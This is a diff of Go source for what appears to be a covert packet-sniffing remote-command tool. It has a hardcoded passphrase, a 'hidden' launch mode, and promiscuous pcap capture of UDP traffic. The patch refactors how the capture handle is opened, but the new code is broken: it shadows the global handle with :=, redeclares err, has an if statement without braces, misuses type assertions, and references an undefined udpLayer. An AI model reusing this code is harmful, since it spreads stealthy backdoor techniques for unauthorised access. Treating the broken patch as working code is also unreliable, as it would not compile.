@@ -44,8 +44,13 @@ import(
 	"github.com/google/gopacket"
 	"net"
 )
+
 const passwd = "DAMNPANDIMENSIONALMICE"; //The authentication code
-var authenticatedAddr string; //Currently authenticated address
+
+var (
+	authenticatedAddr string; //Currently authenticated address
+	handle *pcap.Handle
+)
 /* 
     FUNCTION: func main()
     RETURNS: Nothing
@@ -68,7 +73,7 @@ func main(){
 	//flags
 
 	flag.Parse();
-
+	
 	if *hiddenPtr == "false" && *modePtr == "server" {
 
 		var procAttr os.ProcAttr 
@@ -93,6 +98,10 @@ func main(){
 	}
 
 	intiateTools();
+	
+	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
+	checkError(err);
+
 	
 	switch *modePtr {
 	case "client":
@@ -213,25 +222,22 @@ func grabOutput(serverConn *net.UDPConn) {
 */
 func intiateServer(iface string, port, lport int){
 
-	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
-	checkError(err);
-	err = handle.SetBPFFilter("udp");
-	checkError(err);
+	var ipLayer layers.IPv4
+	var ethLayer layers.Ethernet
 
+	parser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer)
+	decoded := []gopacket.LayerType{}
+	
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
 		packet, err := packetSource.NextPacket() 
-		if err == io.EOF {
-			break
-		} else if err != nil {
-			log.Println("Error:", err)
-			continue;
-		}
-		if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-			if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
-				handlePacket(ipLayer.(*layers.IPv4), udpLayer.(*layers.UDP), port, lport);
-			}
-		}
+		checkError(err);
+
+		err := parser.DecodeLayers(packet, &decoded)
+
+		if ipLayer.Protocol == layers.IPProtocolUDP
+		handlePacket(ipLayer.(*layers.IPv4), udpLayer.(*layers.UDP), port, lport);
+	
 	}
 }
 /* 
